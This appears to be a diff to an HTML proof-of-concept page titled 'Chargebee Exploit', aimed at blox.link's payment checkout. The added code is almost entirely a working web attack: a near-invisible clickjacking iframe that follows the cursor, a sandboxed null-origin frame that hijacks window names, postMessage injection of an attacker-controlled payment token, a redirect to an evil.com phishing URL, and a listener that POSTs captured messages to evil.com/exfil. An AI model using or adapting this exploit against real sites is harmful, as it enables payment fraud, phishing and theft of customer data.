@@ -1,30 +1,68 @@
 <!DOCTYPE html>
 <html>
+<head><title>Chargebee Exploit</title></head>
 <body>
-<iframe src="https://blox.link/payment-page" id="victim"></iframe>
-<script>
-setTimeout(() => {
-    const payload = {
-        cbEvent: true,
-        targetWindowName: 'cb-iframe', // or check actual window name
-        srcWindowName: 'attacker',
-        message: {
-            action: 'process_payment',
-            data: { amount: 0.01 }
-        },
-        replyId: '123'
-    };
-    
-    document.getElementById('victim').contentWindow.postMessage(
-        payload, 
-        'https://blox.link'
-    );
-}, 2000);
+<h1>Processing payment...</h1>
 
-// Listen for responses
+<!-- Invisible clickjacking overlay -->
+<iframe 
+  id="victim" 
+  src="https://blox.link/checkout"
+  style="position:absolute; opacity:0.001; width:100%; height:100%; z-index:9999"
+></iframe>
+
+<!-- Null origin attack frame -->
+<iframe sandbox="allow-scripts allow-popups" srcdoc="
+<script>
+  let popup;
+  
+  // Attack 1: Window name hijacking
+  const hijackFrame = window.open('https://blox.link/404', 'cb-payment-callback');
+  
+  // Attack 2: Null origin postMessage
+  setTimeout(() => {
+    popup = window.open('https://blox.link/checkout');
+    
+    setTimeout(() => {
+      // Both windows have null origin now
+      popup.postMessage({
+        cbEvent: true,
+        targetWindowName: 'cb-iframe',
+        message: {
+          key: 'SET_HP_TOKEN',
+          value: 'ATTACKER_CONTROLLED_TOKEN'
+        }
+      }, '*');
+      
+      // Attack 3: Redirect injection
+      popup.postMessage({
+        key: 'SUCCESS',
+        redirectUrl: 'https://evil.com/phishing?stolen=true',
+        value: 'payment_success',
+        data: { customerId: 'victim123' }
+      }, '*');
+    }, 2000);
+  }, 1000);
+</script>
+"></iframe>
+
+<!-- Cursor-following clickjacking -->
+<script>
+const iframe = document.getElementById('victim');
+document.addEventListener('mousemove', (e) => {
+  iframe.style.left = (e.clientX - 50) + 'px';
+  iframe.style.top = (e.clientY - 20) + 'px';
+});
+
+// Listen for exfiltrated data
 window.addEventListener('message', (e) => {
-    console.log('Response:', e.data);
+  console.log('Stolen data:', e.data);
+  fetch('https://evil.com/exfil', {
+    method: 'POST',
+    body: JSON.stringify(e.data)
+  });
 });
 </script>
+
 </body>
 </html>
